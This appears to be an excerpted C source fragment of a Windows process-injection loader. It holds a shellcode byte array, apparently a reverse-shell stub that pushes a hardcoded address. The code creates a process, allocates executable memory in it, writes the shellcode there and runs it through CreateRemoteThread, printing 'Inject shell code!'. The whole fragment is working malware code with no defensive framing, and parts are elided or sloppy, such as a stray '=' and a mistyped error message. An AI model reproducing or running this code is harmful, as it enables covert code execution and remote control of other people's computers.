...
"\x52\x0c\x8b\x52\x14\x89\xe5\x31\xff\x0f\xb7\x4a\x26\x8b"
...
"\x6b\x00\xff\xd5\x6a\x0a\x68\x92\x36\x0c\x4d\x68\x02\x00"
"\x2f\x50\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
...
=    if (!CreateProcessA(
        ...
        &si, &pi))
    {
        printf("[-] error in running process: %d\n", GetLastError());
        return -1;
    }
    printf("[+]  created.\n", pi.dwProcessId);

    LPVOID remoteAlloc = VirtualAllocEx(
        pi.hProcess, NULL, sizeof(buf),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAlloc) {
        printf("[-] error in memory: %d\n", GetLastError());
        return -1;
    }

    SIZE_T written;
    if (!WriteProcessMemory(
        pi.hProcess, remoteAlloc, buf,
        sizeof(buf), &written))
    {
        printf("[-] error in write memory: %d\n", GetLastError());
        return -1;
    }

    HANDLE hThread = CreateRemoteThread(
        pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteAlloc,
        NULL, 0, NULL);
    if (!hThread) {
        printf("[-] error in create threat: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Inject shell code!\n");
